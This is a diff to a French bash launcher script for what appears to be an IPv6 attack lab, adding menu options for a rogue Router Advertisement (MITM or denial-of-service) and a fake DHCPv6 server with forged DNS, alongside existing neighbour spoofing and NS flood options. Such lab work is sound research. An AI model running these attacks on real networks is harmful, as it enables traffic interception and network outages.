@@ -1,7 +1,7 @@
 #!/bin/bash
 # attaques/lancer.sh — Lanceur interactif pour les attaques IPv6
 # il faut donner droits d'exécution à ce script : chmod +x attaques/lancer.sh une seule fois
-# PUIS le lancer avec sudo ./attaques/lancer.sh et choisir l'attaque à exécuter (1, 2 ou 3)
+# PUIS le lancer avec sudo ./attaques/lancer.sh et choisir l'attaque à exécuter (1 à 5)
 
 DIR="$(cd "$(dirname "$0")" && pwd)"
 
@@ -9,8 +9,10 @@ echo "=== MENU ATTAQUES IPv6 ==="
 echo "  1) NA Spoofing (empoisonnement simple)"
 echo "  2) NA Spoofing + MITM (empoisonnement + relais routeur)"
 echo "  3) NS Flood (saturation du cache de voisins)"
+echo "  4) Faux RA (mode MITM : préférence haute, ou DoS : routerlifetime=0)"
+echo "  5) Faux serveur DHCPv6 (adresse + DNS falsifiés)"
 echo "  0) Quitter"
-read -p "Choix [1/2/3/0] : " choix
+read -p "Choix [1/2/3/4/5/0] : " choix
 
 [ "$choix" = "0" ] || [ -z "$choix" ] && exit 0
 
@@ -48,6 +50,20 @@ case "$choix" in
         python3 "$DIR/ns_flood.py" --iface "$iface" --phase "$phase" --essai "$essai" \
             --prefixe 2001:db8:10:10::/64 --nb-adresses 2000 --debit 200 \
             --duree "$duree" --ping-cible 2001:db8:10:10::1 --silencieux $OPT_DRY
+        ;;
+    4)
+        read -p "Mode (mitm/dos) [mitm] : " mode_ra
+        mode_ra=${mode_ra:-mitm}
+        src_defaut="fe80::2"
+        [ "$mode_ra" = "dos" ] && src_defaut="fe80::1"
+        read -p "Adresse source du faux RA [$src_defaut] : " src_ra
+        src_ra=${src_ra:-$src_defaut}
+        python3 "$DIR/fake_ra.py" --iface "$iface" --phase "$phase" --essai "$essai" \
+            --mode "$mode_ra" --src "$src_ra" --duree "$duree" $OPT_DRY
+        ;;
+    5)
+        python3 "$DIR/fake_dhcpv6.py" --iface "$iface" --phase "$phase" --essai "$essai" \
+            --duree "$duree" $OPT_DRY
         ;;
     *)
         echo "Choix invalide."
